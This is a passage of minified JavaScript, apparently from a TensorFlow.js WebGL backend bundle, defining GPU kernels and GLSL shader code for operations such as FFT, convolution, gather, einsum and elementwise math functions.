            this.variableNames = ["X"],
            this.outputShape = [t, t],
            this.userCode = "\n      void main() {\n          ivec2 coords = getOutputCoords();\n          float val = coords[0] == coords[1] ? getX(coords[0]) : 0.0;\n          setOutput(val);\n      }\n    "
        }
    }
    const tO = {
        kernelName: "Diag",
        backendName: "webgl",
        kernelFunc: function qP(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t
              , o = [...s.shape, ...s.shape]
              , r = Z(s.shape)
              , i = tt({
                inputs: {
                    x: s
                },
                backend: e,
                attrs: {
                    shape: [r]
                }
            })
              , a = new jP(r)
              , c = e.runWebGLProgram(a, [i], i.dtype)
              , l = tt({
                inputs: {
                    x: c
                },
                backend: e,
                attrs: {
                    shape: o
                }
            });
            return e.disposeIntermediateTensorInfo(i),
            e.disposeIntermediateTensorInfo(c),
            l
        }
    };
    class eO {
        constructor(t) {
            this.variableNames = ["x", "W"],
            this.outputShape = t.outShape;
            const {inHeight: e, inWidth: s, padInfo: o, strideHeight: r, strideWidth: i, filterHeight: a, filterWidth: c, dilationHeight: l, dilationWidth: u} = t
              , {top: d, left: h} = o;
            this.userCode = `\n      const ivec2 strides = ivec2(${r}, ${i});\n      const ivec2 pads = ivec2(${d}, ${h});\n      const float neg_infinity = -3.4e38;\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords.x;\n        int d1 = coords.w;\n        ivec2 outTopLeftCorner =\n            coords.yz * strides - pads;\n        int hBeg = outTopLeftCorner.x;\n        int wBeg = outTopLeftCorner.y;\n\n        float curVal = neg_infinity;\n        for (int h = 0; h < ${a}; h++) {\n          int hIn = hBeg + h * ${l};\n\n          if (hIn >= 0 && hIn < ${e}) {\n            for (int w = 0; w < ${c}; w++) {\n              int wIn = wBeg + w * ${u};\n\n              if (wIn >= 0 && wIn < ${s}) {\n                float xVal = getX(batch, hIn, wIn, d1);\n                float wVal = getW(h, w, d1);\n\n                float val = xVal + wVal;\n                if (val > curVal) {\n                  curVal = val;\n                }\n              }\n            }\n          }\n        }\n\n        float result = curVal;\n        setOutput(result);\n      }\n    `
        }
    }
    const sO = {
        kernelName: Da,
        backendName: "webgl",
        kernelFunc: function nO(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r} = t
              , {strides: i, pad: a, dilations: c} = s
              , l = Si(o.shape, r.shape, i, a, "NHWC", c);
            let u;
            const d = new eO(l);
            u = e.runWebGLProgram(d, [o, r], "float32");
            const h = tt({
                inputs: {
                    x: u
                },
                backend: e,
                attrs: {
                    shape: l.outShape
                }
            });
            return e.disposeIntermediateTensorInfo(u),
            h
        }
    };
    const rO = {
        kernelName: wu,
        backendName: "webgl",
        kernelFunc: function oO(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {equation: o} = s
              , r = t
              , {allDims: i, summedDims: a, idDims: c} = bh(o, r.length);
            yh(i.length, c, r);
            const {path: l, steps: u} = Ih(a, c)
              , d = u.length;
            let h = null
              , p = i.length;
            const f = [];
            for (let m = 0; m < d; ++m) {
                for (const g of u[m]) {
                    const {permutationIndices: b, expandDims: x} = xh(p, c[g]);
                    let I;
                    wh(b) ? I = r[g] : (I = Me({
                        inputs: {
                            x: r[g]
                        },
                        backend: e,
                        attrs: {
                            perm: b
                        }
                    }),
                    f.push(I));
                    const y = I.shape.slice();
                    for (let w = 0; w < x.length; ++w)
                        y.splice(x[w], 0, 1);
                    Rt(I.shape, y) || (I = tt({
                        inputs: {
                            x: I
                        },
                        backend: e,
                        attrs: {
                            shape: y
                        }
                    }),
                    f.push(I)),
                    null === h ? h = I : (h = Ep({
                        inputs: {
                            a: I,
                            b: h
                        },
                        backend: e
                    }),
                    f.push(h))
                }
                m < d - 1 && (l[m] >= 0 && (h = Gl({
                    inputs: {
                        x: h
                    },
                    backend: e,
                    attrs: {
                        axis: l[m] - (i.length - p),
                        keepDims: !1
                    }
                }),
                f.push(h)),
                p--)
            }
            for (const m of f)
                m !== h && e.disposeIntermediateTensorInfo(m);
            return h
        }
    }
      , iO = Tt({
        opSnippet: "return (x >= 0.0) ? x : (exp(x) - 1.0);",
        packedOpSnippet: "\n  vec4 result;\n\n  result.r = (x.r >= 0.0) ? x.r : (exp(x.r) - 1.0);\n  result.g = (x.g >= 0.0) ? x.g : (exp(x.g) - 1.0);\n  result.b = (x.b >= 0.0) ? x.b : (exp(x.b) - 1.0);\n  result.a = (x.a >= 0.0) ? x.a : (exp(x.a) - 1.0);\n\n  return result;\n"
    })
      , aO = {
        kernelName: Vr,
        backendName: "webgl",
        kernelFunc: iO
    }
      , uO = {
        kernelName: Cu,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e} = n
              , {dy: s, y: o} = t
              , r = z().getBool("WEBGL_PACK_BINARY_OPERATIONS") ? new gr("\n  vec4 bGTEZero = vec4(greaterThanEqual(b, vec4(0.)));\n  return (bGTEZero * a) + ((vec4(1.0) - bGTEZero) * (a * (b + vec4(1.0))));\n",s.shape,o.shape) : new ko("return (b >= 0.0) ? a : a * (b + 1.0);",s.shape,o.shape);
            return e.runWebGLProgram(r, [s, o], s.dtype)
        }
    }
      , dO = Ce({
        opSnippet: "return float(a == b);",
        packedOpSnippet: "\n  return vec4(equal(a, b));\n",
        dtype: "bool",
        cpuKernelImpl: qF
    })
      , hO = {
        kernelName: Wa,
        backendName: "webgl",
        kernelFunc: dO
    }
      , fO = Tt({
        opSnippet: `\n  // Error function is calculated approximately with elementary function.\n  // See "Handbook of Mathematical Functions with Formulas,\n  // Graphs, and Mathematical Tables", Abramowitz and Stegun.\n  float p = ${lh};\n  float a1 = ${uh};\n  float a2 = ${dh};\n  float a3 = ${hh};\n  float a4 = ${ph};\n  float a5 = ${fh};\n\n  float sign = sign(x);\n  x = abs(x);\n  float t = 1.0 / (1.0 + p * x);\n  return sign * (1.0 - (((((a5*t + a4)*t) + a3)*t + a2)*t + a1)*t*exp(-x*x));\n`
    })
      , mO = {
        kernelName: Fr,
        backendName: "webgl",
        kernelFunc: fO
    }
      , iI = Tt({
        opSnippet: br + "\n  return exp(x);\n",
        packedOpSnippet: "\n  vec4 result = exp(x);\n  bvec4 isNaN = isnan(x);\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n",
        cpuKernelImpl: tz,
        dtype: "float32"
    })
      , bO = {
        kernelName: zr,
        backendName: "webgl",
        kernelFunc: iI
    };
    function Vp(n) {
        const {inputs: t, attrs: e, backend: s} = n
          , {dim: o} = e
          , {input: r} = t
          , i = r.shape.length
          , a = r.shape.slice();
        let c = o;
        return o < 0 && (v(-(i + 1) <= o, (()=>`Axis must be in the interval [${-(i + 1)}, ${i}]`)),
        c = i + o + 1),
        a.splice(c, 0, 1),
        tt({
            inputs: {
                x: r
            },
            backend: s,
            attrs: {
                shape: a
            }
        })
    }
    const xO = {
        kernelName: Ma,
        backendName: "webgl",
        kernelFunc: Vp
    }
      , aI = "return exp(x) - 1.0;"
      , yO = Tt({
        opSnippet: aI,
        packedOpSnippet: aI,
        cpuKernelImpl: ez
    })
      , IO = {
        kernelName: Xr,
        backendName: "webgl",
        kernelFunc: yO
    };
    class cI {
        constructor(t, e, s) {
            this.variableNames = ["real", "imag"];
            const o = e[1];
            this.outputShape = e;
            const r = s ? `2.0 * ${Math.PI}` : `-2.0 * ${Math.PI}`
              , i = s ? `${o}.0` : "1.0";
            let a;
            if ("real" === t)
                a = "return real * expR - imag * expI;";
            else {
                if ("imag" !== t)
                    throw new Error(`FFT component must be either "real" or "imag", got ${t}.`);
                a = "return real * expI + imag * expR;"
            }
            this.userCode = `\n      const float exponentMultiplier = ${r};\n\n      float unaryOpComplex(float real, float expR, float imag, float expI) {\n        ${a}\n      }\n\n      float mulMatDFT(int batch, int index) {\n        float indexRatio = float(index) / float(${o});\n        float exponentMultiplierTimesIndexRatio =\n            exponentMultiplier * indexRatio;\n\n        float result = 0.0;\n\n        for (int i = 0; i < ${o}; i++) {\n          // x = (-2|2 * PI / N) * index * i;\n          float x = exponentMultiplierTimesIndexRatio * float(i);\n          float expR = cos(x);\n          float expI = sin(x);\n          float real = getReal(batch, i);\n          float imag = getImag(batch, i);\n\n          result +=\n              unaryOpComplex(real, expR, imag, expI) / ${i};\n        }\n\n        return result;\n      }\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        setOutput(mulMatDFT(coords[0], coords[1]));\n      }\n    `
        }
    }
    function lI(n, t, e) {
        const s = e.texData.get(n.dataId)
          , o = Z(n.shape)
          , r = n.shape[n.shape.length - 1]
          , a = tt({
            inputs: {
                x: n
            },
            backend: e,
            attrs: {
                shape: [o / r, r]
            }
        })
          , c = a.shape
          , l = new cI("real",c,t)
          , u = new cI("imag",c,t)
          , d = [{
            dataId: s.complexTensorInfos.real.dataId,
            dtype: s.complexTensorInfos.real.dtype,
            shape: c
        }, {
            dataId: s.complexTensorInfos.imag.dataId,
            dtype: s.complexTensorInfos.imag.dtype,
            shape: c
        }]
          , h = e.runWebGLProgram(l, d, "float32")
          , p = e.runWebGLProgram(u, d, "float32")
          , f = zs({
            inputs: {
                real: h,
                imag: p
            },
            backend: e
        });
        e.disposeIntermediateTensorInfo(h),
        e.disposeIntermediateTensorInfo(p);
        const m = tt({
            inputs: {
                x: f
            },
            backend: e,
            attrs: {
                shape: n.shape
            }
        });
        return e.disposeIntermediateTensorInfo(a),
        e.disposeIntermediateTensorInfo(f),
        m
    }
    const CO = {
        kernelName: "FFT",
        backendName: "webgl",
        kernelFunc: function wO(n) {
            const {inputs: t, backend: e} = n
              , {input: s} = t;
            return lI(s, !1, e)
        }
    };
    class vO {
        constructor(t, e) {
            this.outputShape = [],
            this.customUniforms = [{
                name: "value",
                type: "float"
            }],
            this.variableNames = ["x"],
            this.outputShape = t,
            this.userCode = "\n      void main() {\n        // Input can be obtained from uniform value.\n        setOutput(value);\n      }\n    "
        }
    }
    function ha(n) {
        const {backend: t, attrs: e} = n
          , {shape: s, value: o} = e;
        let {dtype: r} = e;
        if (r = r || Mo(o),
        "string" === r) {
            const i = qt(r, Z(s));
            return i.fill(o),
            t.makeTensorInfo(s, r, i)
        }
        {
            const i = new vO(s,o)
              , a = [[o]];
            return t.runWebGLProgram(i, [], r, a)
        }
    }
    const SO = {
        kernelName: Su,
        backendName: "webgl",
        kernelFunc: ha
    };
    class kO {
        constructor(t) {
            this.variableNames = ["Image"],
            this.outputShape = [];
            const e = t[2];
            this.outputShape = t,
            this.userCode = `\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int x = coords[2];\n\n          int coordX = ${e} - x - 1;\n          float outputValue;\n          if(coordX >= 0 && coordX < ${e}) {\n            outputValue = getImage(coords[0], coords[1], coordX, coords[3]);\n          } else {\n            outputValue = getImage(coords[0], coords[1], coords[2], coords[3]);\n          }\n          setOutput(outputValue);\n        }\n    `
        }
    }
    const TO = {
        kernelName: ku,
        backendName: "webgl",
        kernelFunc: ({inputs: n, backend: t})=>{
            const {image: e} = n
              , s = t
              , o = new kO(e.shape);
            return s.runWebGLProgram(o, [e], e.dtype)
        }
    }
      , uI = "return floor(x);"
      , NO = Tt({
        opSnippet: uI,
        packedOpSnippet: uI,
        cpuKernelImpl: nz
    })
      , RO = {
        kernelName: Ar,
        backendName: "webgl",
        kernelFunc: NO
    }
      , $O = Ce({
        opSnippet: "\n  float s = sign(a) * sign(b);\n  int ia = round(a);\n  int ib = round(b);\n  if (ib != 0) {\n    // Windows (D3D) wants guaranteed non-zero int division at compile-time.\n    return float(idiv(ia, ib, s));\n  } else {\n    return NAN;\n  }\n",
        packedOpSnippet: "\n  ivec4 ia = round(a);\n  ivec4 ib = round(b);\n  bvec4 cond = notEqual(ib, ivec4(0));\n  ivec4 result = ivec4(0);\n  vec4 s = sign(a) * sign(b);\n\n  // Windows (D3D) wants guaranteed non-zero int division at compile-time.\n  if (cond[0]) {\n    result[0] = idiv(ia[0], ib[0], s[0]);\n  }\n  if (cond[1]) {\n    result[1] = idiv(ia[1], ib[1], s[1]);\n  }\n  if (cond[2]) {\n    result[2] = idiv(ia[2], ib[2], s[2]);\n  }\n  if (cond[3]) {\n    result[3] = idiv(ia[3], ib[3], s[3]);\n  }\n  return vec4(result);\n",
        dtype: "int32"
    })
      , GO = {
        kernelName: Pr,
        backendName: "webgl",
        kernelFunc: $O
    };
    class LO {
        constructor(t) {
            this.variableNames = ["A"];
            const e = De()
              , [s,o] = t;
            this.outputShape = t,
            this.userCode = `\n      void main() {\n        ivec3 coords = getOutputCoords();\n        int texR = coords[0];\n        int texC = coords[1];\n        int depth = coords[2];\n        vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${o}.0, ${s}.0);\n\n        vec4 values = ${e.texture2D}(A, uv);\n        float value;\n        if (depth == 0) {\n          value = values.r;\n        } else if (depth == 1) {\n          value = values.g;\n        } else if (depth == 2) {\n          value = values.b;\n        } else if (depth == 3) {\n          value = values.a;\n        }\n\n        setOutput(floor(value * 255.0 + 0.5));\n      }\n    `
        }
    }
    class EO {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !1,
            this.packedOutput = !0;
            const e = De()
              , [s,o] = t;
            this.outputShape = t,
            this.userCode = `\n      void main() {\n        ivec3 coords = getOutputCoords();\n        int texR = coords[0];\n        int texC = coords[1];\n        int depth = coords[2];\n\n        vec4 result = vec4(0.);\n\n        for(int row=0; row<=1; row++) {\n          for(int col=0; col<=1; col++) {\n            texC = coords[1] + row;\n            depth = coords[2] + col;\n\n            vec2 uv = (vec2(texC, texR) + halfCR) /\n                       vec2(${o}.0, ${s}.0);\n            vec4 values = ${e.texture2D}(A, uv);\n            float value;\n            if (depth == 0) {\n              value = values.r;\n            } else if (depth == 1) {\n              value = values.g;\n            } else if (depth == 2) {\n              value = values.b;\n            } else if (depth == 3) {\n              value = values.a;\n            }\n\n            result[row * 2 + col] = floor(value * 255.0 + 0.5);\n          }\n        }\n\n        ${e.output} = result;\n      }\n    `
        }
    }
    const DO = {
        kernelName: Zu,
        backendName: "webgl",
        kernelFunc: function WO(n) {
            const {inputs: t, backend: e, attrs: s} = n;
            let {pixels: o} = t;
            const {numChannels: r} = s
              , i = typeof HTMLVideoElement < "u" && o instanceof HTMLVideoElement
              , a = typeof HTMLImageElement < "u" && o instanceof HTMLImageElement
              , [c,l] = i ? [o.videoWidth, o.videoHeight] : [o.width, o.height]
              , u = [l, c]
              , d = [l, c, r];
            if (a || i) {
                const m = z().getBool("CANVAS2D_WILL_READ_FREQUENTLY_FOR_GPU");
                (null == yr || m !== Fp) && (Fp = m,
                yr = document.createElement("canvas").getContext("2d", {
                    willReadFrequently: Fp
                })),
                yr.canvas.width = c,
                yr.canvas.height = l,
                yr.drawImage(o, 0, 0, c, l),
                o = yr.canvas
            }
            const h = e.makeTensorInfo(u, "int32");
            e.texData.get(h.dataId).usage = an.PIXELS,
            e.gpgpu.uploadPixelDataToTexture(e.getTexture(h.dataId), o);
            const p = z().getBool("WEBGL_PACK") ? new EO(d) : new LO(d)
              , f = e.runWebGLProgram(p, [h], "int32");
            return e.disposeData(h.dataId),
            f
        }
    };
    let yr, Fp = z().getBool("CANVAS2D_WILL_READ_FREQUENTLY_FOR_GPU");
    const VO = {
        kernelName: Ic,
        backendName: "webgl",
        kernelFunc: function MO(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r, bias: i, preluActivationWeights: a} = t
              , {strides: c, pad: l, dataFormat: u, dilations: d, dimRoundingMode: h, activation: p, leakyreluAlpha: f} = s
              , m = os(u)
              , g = ye(o.shape, r.shape, c, d, l, h, !1, m);
            let b;
            const x = []
              , I = null != i
              , y = null != a
              , w = "leakyrelu" === p
              , C = ()=>{
                const S = [o, r]
                  , T = (R,L)=>{
                    if ("NCHW" === L && 1 === R.shape.length && 1 !== R.shape[0]) {
                        const V = tt({
                            inputs: {
                                x: R
                            },
                            backend: e,
                            attrs: {
                                shape: [R.shape[0], 1, 1]
                            }
                        });
                        return x.push(V),
                        V
                    }
                    return R
                }
                ;
                if (I && S.push(T(i, u)),
                y && S.push(T(a, u)),
                w) {
                    const R = e.makeTensorInfo([], "float32", gs(f, "float32"));
                    S.push(R),
                    x.push(R)
                }
                return S
            }
            ;
            if (1 !== g.filterHeight || 1 !== g.filterWidth || 1 !== g.dilationHeight || 1 !== g.dilationWidth || 1 !== g.strideHeight || 1 !== g.strideWidth || "SAME" !== g.padInfo.type && "VALID" !== g.padInfo.type)
                if (g.strideWidth <= 2 && "channelsLast" === m && z().getBool("WEBGL_EXP_CONV")) {
                    const S = p ? aa(p, !0) : null
                      , T = new J1(g,I,S,y,w)
                      , R = [[g.padInfo.top, g.padInfo.left], [g.strideHeight, g.strideWidth], [g.dilationHeight, g.dilationWidth], [g.inHeight, g.inWidth]]
                      , L = C();
                    b = e.runWebGLProgram(T, L, "float32", R)
                } else if (z().getBool("WEBGL_CONV_IM2COL"))
                    b = q1({
                        x: o,
                        filter: r,
                        convInfo: g,
                        backend: e,
                        bias: i,
                        activation: p,
                        preluActivationWeights: a,
                        leakyreluAlpha: f
                    });
                else {
                    const S = p ? aa(p, !1) : null
                      , T = new Q1(g,I,S,y,w)
                      , R = C();
                    b = e.runWebGLProgram(T, R, "float32")
                }
            else
                b = j1({
                    x: o,
                    filter: r,
                    convInfo: g,
                    backend: e,
                    bias: i,
                    activation: p,
                    preluActivationWeights: a,
                    leakyreluAlpha: f
                });
            const k = tt({
                inputs: {
                    x: b
                },
                backend: e,
                attrs: {
                    shape: g.outShape
                }
            });
            return x.push(b),
            x.forEach((S=>e.disposeIntermediateTensorInfo(S))),
            k
        }
    };
    const zO = {
        kernelName: zf,
        backendName: "webgl",
        kernelFunc: function FO(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r, bias: i, preluActivationWeights: a} = t
              , {strides: c, pad: l, dilations: u, dimRoundingMode: d, activation: h, leakyreluAlpha: p} = s
              , f = [];
            let m = u;
            null == m && (m = [1, 1]),
            v(Te(c, m), (()=>`Error in depthwiseConv2d: Either strides or dilations must be 1. Got strides ${c} and dilations '${m}'`));
            const g = ye(o.shape, r.shape, c, m, l, d, !0)
              , b = z().getBool("WEBGL_PACK_DEPTHWISECONV") && g.strideWidth <= 2 && g.outChannels / g.inChannels == 1
              , x = h ? aa(h, b) : null
              , I = [o, r]
              , y = null != i
              , w = null != a
              , C = "leakyrelu" === h;
            if (y && I.push(i),
            w && I.push(a),
            C) {
                const R = e.makeTensorInfo([], "float32", gs(p, "float32"));
                I.push(R),
                f.push(R)
            }
            let k;
            k = b ? new rI(g,y,x,w,C) : new oI(g,y,x,w,C);
            const S = [[g.padInfo.top, g.padInfo.left], [g.strideHeight, g.strideWidth], [g.dilationHeight, g.dilationWidth], [g.inHeight, g.inWidth]]
              , T = e.runWebGLProgram(k, I, "float32", S);
            return f.forEach((R=>e.disposeIntermediateTensorInfo(R))),
            T
        }
    };
    class XO {
        constructor(t, e, s, o) {
            this.sliceDim = t,
            this.strides = e,
            this.paramsShape = o,
            this.variableNames = ["x", "indices"],
            this.outputShape = s;
            const r = Wt(s.length);
            let i = "\n    int index;";
            for (let a = 0; a < this.sliceDim; a++)
                i += `\n          index = round(getIndices(coords[0], ${a}));\n          out_of_bounds = out_of_bounds || index < 0;\n          out_of_bounds = out_of_bounds || index >= ${this.paramsShape[a]};\n          flattenIndex += index * ${this.strides[a]};`;
            this.userCode = `\n         void main() {\n          ${r} coords = getOutputCoords();\n          int flattenIndex = 0;\n          bool out_of_bounds = false;\n\n          ${i}\n\n          setOutput(out_of_bounds ? 0.0 : getX(flattenIndex, coords[1]));\n        }\n      `
        }
    }
    const PO = {
        kernelName: If,
        backendName: "webgl",
        kernelFunc: function AO(n) {
            const {inputs: t, backend: e} = n
              , {params: s, indices: o} = t
              , r = o.shape
              , i = r[r.length - 1]
              , a = Z(s.shape)
              , [c,l,u,d] = Jd(s, o)
              , h = tt({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: [l, i]
                }
            })
              , p = tt({
                inputs: {
                    x: s
                },
                backend: e,
                attrs: {
                    shape: [Z(s.shape) / u, u]
                }
            });
            if (e.shouldExecuteOnCPU([s, o]) || "string" === s.dtype) {
                const b = e.readSync(o.dataId)
                  , x = e.bufferSync(s)
                  , I = sz(b, x, s.dtype, l, i, u, d, s.shape, a);
                return e.makeTensorInfo(c, s.dtype, I.values)
            }
            const f = new XO(i,d,[l, u],s.shape)
              , m = e.runWebGLProgram(f, [p, h], p.dtype)
              , g = tt({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    shape: c
                }
            });
            return e.disposeIntermediateTensorInfo(h),
            e.disposeIntermediateTensorInfo(p),
            e.disposeIntermediateTensorInfo(m),
            g
        }
    };
    class OO {
        constructor(t, e) {
            this.variableNames = ["A", "indices"],
            this.outputShape = e,
            this.rank = e.length;
            const s = Wt(this.rank)
              , o = function KO(n, t) {
                const e = ["resRC.x", "resRC.y", "resRC.z", "resRC.w"]
                  , s = [];
                for (let o = 0; o < n.length; o++)
                    2 === o ? s.push("index") : s.push(`${e[o]}`);
                return s.join()
            }(t);
            this.userCode = `\n      void main() {\n        ${s} resRC = getOutputCoords();\n        int index = int(getIndices(resRC.x, resRC.z));\n        float inBounds = (index >= 0) && (index < ${t[2]}) ? 1.0 : 0.0;\n        setOutput(inBounds * getA(${o}));\n      }\n    `
        }
    }
    function dI(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o, indices: r} = t
          , {axis: i, batchDims: a} = s
          , c = It(i, o.shape)[0];
        if (z().get("DEBUG")) {
            const x = e.readSync(r.dataId)
              , I = o.shape[c];
            for (let y = 0; y < x.length; ++y) {
                const w = x[y];
                v(w <= I - 1 && w >= 0, (()=>`GatherV2: the index value ${w} is not in [0, ${I - 1}]`))
            }
        }
        const l = Sh(o, r, c, a)
          , u = Z(r.shape)
          , d = []
          , h = tt({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                shape: [l.batchSize, l.outerSize, l.dimSize, l.sliceSize]
            }
        })
          , p = tt({
            inputs: {
                x: r
            },
            backend: e,
            attrs: {
                shape: [l.batchSize, u / l.batchSize]
            }
        });
        d.push(h),
        d.push(p);
        const f = [l.batchSize, l.outerSize, u / l.batchSize, l.sliceSize];
        if (e.shouldExecuteOnCPU([o, r]) || "string" === o.dtype) {
            const x = e.bufferSync(p)
              , I = e.bufferSync(h)
              , y = oz(I, x, f);
            return d.forEach((w=>e.disposeIntermediateTensorInfo(w))),
            e.makeTensorInfo(l.outputShape, y.dtype, y.values)
        }
        const m = new OO(h.shape,f)
          , g = e.runWebGLProgram(m, [h, p], h.dtype);
        d.push(g);
        const b = tt({
            inputs: {
                x: g
            },
            backend: e,
            attrs: {
                shape: l.outputShape
            }
        });
        return d.forEach((x=>e.disposeIntermediateTensorInfo(x))),
        b
    }
    const ZO = {
        kernelName: Fa,
        backendName: "webgl",
        kernelFunc: dI
    }
      , BO = Ce({
        opSnippet: "return float(a > b);",
        packedOpSnippet: "\n  return vec4(greaterThan(a, b));\n",
        cpuKernelImpl: rz,
        dtype: "bool"
    })
      , HO = {
        kernelName: za,
        backendName: "webgl",
        kernelFunc: BO
    }
      , _O = Ce({
        opSnippet: "return float(a >= b);",
        packedOpSnippet: "\n  return vec4(greaterThanEqual(a, b));\n",
        dtype: "bool",
        cpuKernelImpl: iz
    })
      , UO = {
        kernelName: Or,
        backendName: "webgl",
        kernelFunc: _O
    };
    const QO = {
        kernelName: Tu,
        backendName: "webgl",
        kernelFunc: function YO(n) {
            const {inputs: t, backend: e} = n
              , {input: s} = t;
            return lI(s, !0, e)
        }
    }
      , JO = Tt({
        opSnippet: "return float(!isnan(x) && !isinf(x));",
        dtype: "bool"
    })
      , jO = {
        kernelName: Zr,
        backendName: "webgl",
        kernelFunc: JO
    }
      , qO = Tt({
        opSnippet: "return float(isinf(x));",
        dtype: "bool"
    })
      , tK = {
        kernelName: Br,
        backendName: "webgl",
        kernelFunc: qO
    }
      , eK = Tt({
        opSnippet: "return float(isnan(x));",
        dtype: "bool"
    })
      , nK = {
        kernelName: Hr,
        backendName: "webgl",
        kernelFunc: eK
    }
      , sK = Ce({
        opSnippet: "return float(a < b);",
        packedOpSnippet: "\n  return vec4(lessThan(a, b));\n",
        cpuKernelImpl: az,
        dtype: "bool"
    })
      , oK = {
        kernelName: Aa,
        backendName: "webgl",
        kernelFunc: sK
    }
      , rK = Ce({
        opSnippet: "return float(a <= b);",
        packedOpSnippet: "\n  return vec4(lessThanEqual(a, b));\n",
        cpuKernelImpl: cz,
        dtype: "bool"
    })
      , iK = {
        kernelName: Pa,
        backendName: "webgl",
        kernelFunc: rK
    };
    const cK = {
        kernelName: wf,
        backendName: "webgl",
        kernelFunc: function aK(n) {
            const {backend: t, attrs: e} = n
              , {start: s, stop: o, num: r} = e
              , i = lz(s, o, r);
            return t.makeTensorInfo([i.length], "float32", i)
        }
    }
      , uK = Tt({
        opSnippet: br + "\n  return x < 0.0 ? 0./0. : log(x);\n",
        packedOpSnippet: "\n  vec4 result = log(x);\n  bvec4 isNaN = isnan(x);\n  result.r = isNaN.r ? x.r : (x.r < 0.0 ? 0./0. : result.r);\n  result.g = isNaN.g ? x.g : (x.g < 0.0 ? 0./0. : result.g);\n  result.b = isNaN.b ? x.b : (x.b < 0.0 ? 0./0. : result.b);\n  result.a = isNaN.a ? x.a : (x.a < 0.0 ? 0./0. : result.a);\n  return result;\n",
        cpuKernelImpl: uz
    })
      , dK = {
        kernelName: _r,
        backendName: "webgl",
        kernelFunc: uK
    }
      , pK = Tt({
        opSnippet: br + "\n  return log(1.0 + x);\n"
    })
      , fK = {
        kernelName: Ur,
        backendName: "webgl",
        kernelFunc: pK
    }
      , mK = Ce({
        opSnippet: "return float(a >= 1.0 && b >= 1.0);",
        packedOpSnippet: "\n  return vec4(\n    vec4(greaterThanEqual(a, vec4(1.0))) *\n    vec4(greaterThanEqual(b, vec4(1.0))));\n",
        dtype: "bool"
    })
      , gK = {
        kernelName: Oa,
        backendName: "webgl",
        kernelFunc: mK
    }
      , bK = Tt({
        opSnippet: "return float(!(x >= 1.0));"
    })
      , xK = {
        kernelName: Ka,
        backendName: "webgl",
        kernelFunc: bK
    }
      , yK = Ce({
        opSnippet: "return float(a >= 1.0 || b >= 1.0);",
        packedOpSnippet: "\n  return min(\n    vec4(greaterThanEqual(a, vec4(1.0))) +\n    vec4(greaterThanEqual(b, vec4(1.0))),\n    vec4(1.0));\n",
        dtype: "bool"
    })
      , IK = {
        kernelName: Za,
        backendName: "webgl",
        kernelFunc: yK
    };
    class wK {
        constructor(t, e, s, o, r) {
            this.variableNames = ["x"],
            this.outputShape = [];
            const i = e
              , a = t[3] - 1;
            let c;
            this.outputShape = t;
            const l = `float(${s}) + float(${o}) * sum`;
            c = .5 === r ? `inversesqrt(${l})` : 1 === r ? `1.0/(${l})` : `exp(log(${l}) * float(-${r}));`,
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int r = coords[1];\n        int c = coords[2];\n        int d = coords[3];\n        float x = getX(b, r, c, d);\n        float sum = 0.0;\n        for (int j = -${i}; j <= ${i}; j++) {\n          int idx = d + j;\n          if (idx >= 0 && idx <=  ${a}) {\n            float z = getX(b, r, c, idx);\n            sum += z * z;\n          }\n        }\n        float val = x * ${c};\n        setOutput(val);\n      }\n    `
        }
    }
    class CK {
        constructor(t, e, s, o, r) {
            this.variableNames = ["x"],
            this.outputShape = [],
            this.packedInputs = !0,
            this.packedOutput = !0;
            const i = e
              , a = t[3] - 1;
            let c;
            this.outputShape = t;
            const l = `float(${s}) + float(${o}) * sum`;
            c = .5 === r ? `inversesqrt(${l})` : 1 === r ? `1.0/(${l})` : `exp(log(${l}) * float(-${r}));`,
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords.x;\n        int r = coords.y;\n        int c = coords.z;\n        int d = coords.w;\n\n        bool hasNextCol = d < ${this.outputShape[3]};\n        bool hasNextRow = c < ${this.outputShape[2]};\n\n        vec4 sum = vec4(0.);\n        vec4 xFragAtOutputCoords = getX(b, r, c, d);\n\n        vec4 xAtOutputCoords = vec4(\n          getChannel(xFragAtOutputCoords, vec2(c, d)),\n          hasNextCol ?\n            getChannel(xFragAtOutputCoords, vec2(c, d + 1)) : 0.0,\n          hasNextRow ?\n            getChannel(xFragAtOutputCoords , vec2(c + 1, d)) : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getChannel(xFragAtOutputCoords, vec2(c + 1, d + 1)) : 0.0\n        );\n\n        int firstChannel = d - ${i};\n        vec2 cache = vec2(0.);\n        if(firstChannel >= 0){\n          vec4 firstChannelFrag = getX(b, r, c, firstChannel);\n          cache.x = getChannel(firstChannelFrag, vec2(c, firstChannel));\n            if(hasNextRow){\n              cache.y = getChannel(firstChannelFrag, vec2(c + 1, firstChannel));\n            }\n        }\n\n        ivec2 depth = ivec2(d, d + 1);\n        for (int j = - ${i}; j <= ${i}; j++) {\n          ivec2 idx = depth + j;\n          bvec2 aboveLowerBound = greaterThanEqual(idx, ivec2(0));\n          bvec2 belowUpperBound = lessThanEqual(idx, ivec2(${a}));\n\n          bool depthInRange = aboveLowerBound.x && belowUpperBound.x;\n          bool depthPlusOneInRange = aboveLowerBound.y && belowUpperBound.y;\n\n          if(depthInRange || depthPlusOneInRange){\n            vec4 z = vec4(0.);\n            vec4 xFragAtCurrentDepth;\n            z.xz = cache.xy;\n            if(depthPlusOneInRange && hasNextCol){\n              xFragAtCurrentDepth = idx.y != d ?\n                getX(b, r, c, idx.y) : xFragAtOutputCoords;\n              z.y = 